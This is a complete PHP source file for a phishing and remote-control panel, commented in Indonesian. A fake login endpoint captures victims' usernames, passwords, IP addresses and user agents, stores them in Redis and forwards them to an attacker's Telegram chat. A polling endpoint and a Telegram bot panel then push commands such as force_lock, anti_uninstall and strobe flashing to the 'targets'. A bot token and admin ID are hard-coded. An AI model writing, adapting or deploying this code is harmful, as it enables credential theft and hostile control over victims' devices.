<?php
// ================== KONFIG ==================
$BOT_TOKEN = "9246172245:AAEKIfyG-w2Ih3dBDWc-T6eBiWH4FBurxw0";
$ADMIN_ID  = "8922169139";
$REDIS_URL   = getenv("KV_REST_API_URL");
$REDIS_TOKEN = getenv("KV_REST_API_TOKEN");

// ================== HELPER REDIS ==================
function redis($cmd, $args = []) {
    global $REDIS_URL, $REDIS_TOKEN;
    if (!$REDIS_URL) return null;
    $ch = curl_init($REDIS_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode(array_merge([$cmd], $args)),
        CURLOPT_HTTPHEADER     => [
            "Authorization: Bearer $REDIS_TOKEN",
            "Content-Type: application/json"
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($res, true);
    return $json["result"] ?? null;
}

// ================== HELPER BOT ==================
function bot($chat, $text) {
    global $BOT_TOKEN;
    if (!$BOT_TOKEN) return;
    file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$chat&text=" . urlencode($text));
}

// ================== ROUTING ==================
$action = $_GET["action"] ?? "";

// ---------- 1. LOGIN PALSU ----------
if ($action === "login") {
    $token = bin2hex(random_bytes(16));
    redis("SET", ["cred_$token", json_encode([
        "user" => $_POST["username"] ?? "",
        "pass" => $_POST["password"] ?? "",
        "ip"   => $_SERVER["REMOTE_ADDR"] ?? "",
        "ua"   => $_SERVER["HTTP_USER_AGENT"] ?? "",
        "time" => date("Y-m-d H:i:s")
    ])]);
    redis("SADD", ["targets", $token]);
    if ($ADMIN_ID) {
        bot($ADMIN_ID, "🎯 Target baru masuk\nID FF: " . ($_POST["username"] ?? "") . "\nToken: $token");
    }
    header("Location: /?token=$token");
    exit;
}

// ---------- 2. AGENT POLLING DARI TARGET ----------
if ($action === "agent") {
    $token = $_GET["token"] ?? "";
    if (!$token) { echo json_encode(["cmd" => "none"]); exit; }

    if (isset($_GET["set"])) {
        redis("LPUSH", ["cmd_$token", $_GET["set"]]);
        echo json_encode(["ok" => true]);
        exit;
    }

    $cmd = redis("RPOP", ["cmd_$token"]);
    echo json_encode(["cmd" => $cmd ?: "none"]);
    exit;
}

// ---------- 3. TELEGRAM WEBHOOK ----------
if ($action === "bot") {
    $update = json_decode(file_get_contents("php://input"), true);
    $chat = $update["message"]["chat"]["id"] ?? null;
    $text = $update["message"]["text"] ?? "";
    $parts = explode(" ", trim($text));
    $cmd = $parts[0] ?? "";

    if (!$chat || (string)$chat !== (string)$ADMIN_ID) {
        http_response_code(200);
        exit;
    }

    if ($cmd === "/start" || $cmd === "/help") {
        bot($chat, "🤖 CYBER PANEL BOT\nDeveloper: Rilzzy Dex\n\n/list — lihat target\n/cmd <token> <perintah> — kirim perintah\n/hapus <token> — hapus target\n\nPerintah:\nvol_force, vib_agg, flash_strobo, force_lock, unlock, anti_close, anti_uninstall");
    }

    if ($cmd === "/list") {
        $targets = redis("SMEMBERS", ["targets"]) ?: [];
        if (!$targets) { bot($chat, "❌ Tidak ada target."); exit; }
        foreach ($targets as $t) {
            $i = json_decode(redis("GET", ["cred_$t"]) ?: "{}", true);
            bot($chat, "🎯 Token: $t\nID FF: " . ($i['user'] ?? '-') . "\nIP: " . ($i['ip'] ?? '-') . "\nUA: " . substr($i['ua'] ?? '-', 0, 60));
        }
    }

    if ($cmd === "/cmd" && isset($parts[1], $parts[2])) {
        $t = $parts[1]; $p = $parts[2];
        redis("LPUSH", ["cmd_$t", $p]);
        bot($chat, "✅ Perintah '$p' dikirim ke $t");
    }

    if ($cmd === "/hapus" && isset($parts[1])) {
        redis("SREM", ["targets", $parts[1]]);
        redis("DEL", ["cred_" . $parts[1], "cmd_" . $parts[1]]);
        bot($chat, "✅ Target dihapus.");
    }
    exit;
}

http_response_code(404);
echo "404";
